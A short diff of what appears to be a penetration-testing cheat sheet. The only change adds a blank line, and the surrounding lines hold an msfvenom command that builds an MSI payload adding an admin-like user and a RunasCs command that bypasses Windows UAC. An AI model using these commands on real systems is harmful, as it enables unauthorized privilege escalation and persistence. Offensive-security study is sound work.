@@ -85,6 +85,7 @@ msfvenom -p windows/adduser USER=admin2 PASS=P@ssword123! -f msi-nouac -o alwe.m
 
 Using RunasCs.exe to bypass UAC:
 #uac #bypass-uac
+
 ```powershell
 .\RunasCs.exe $USER $PASS $CMD --bypass-uac -l 5
 ```
